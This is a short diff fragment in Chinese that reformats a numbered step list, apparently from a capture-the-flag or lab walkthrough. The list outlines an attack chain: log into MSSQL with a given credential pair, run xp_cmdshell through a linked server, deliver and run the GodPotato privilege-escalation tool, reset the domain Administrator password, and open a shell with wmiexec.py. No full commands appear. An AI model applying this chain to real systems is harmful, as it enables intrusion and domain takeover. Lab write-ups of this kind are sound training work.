-2. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wuwupor / lovlyBaby</font>`<font style="color:rgb(51, 51, 51);"> 登录 MSSQL。</font>
-3. <font style="color:rgb(51, 51, 51);">通过 linked server </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">POO_PUBLIC</font>`<font style="color:rgb(51, 51, 51);"> 执行 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">xp_cmdshell</font>`<font style="color:rgb(51, 51, 51);">。</font>
-4. <font style="color:rgb(51, 51, 51);">向客机投递并运行 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GodPotato-NET4.exe</font>`<font style="color:rgb(51, 51, 51);">。</font>
-5. <font style="color:rgb(51, 51, 51);">把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的域密码改成已知值。</font>
-6. <font style="color:rgb(51, 51, 51);">调用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wmiexec.py</font>`<font style="color:rgb(51, 51, 51);"> 验证 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> shell。</font>
+1. 在宿主机开启临时 HTTP 服务。
+2. 用 `wuwupor / lovlyBaby` 登录 MSSQL。
+3. 通过 linked server `POO_PUBLIC` 执行 `xp_cmdshell`。
+4. 向客机投递并运行 `GodPotato-NET4.exe`。
+5. 把 `Administrator` 的域密码改成已知值。
+6. 调用 `wmiexec.py` 验证 `Administrator` shell。
 
 
 
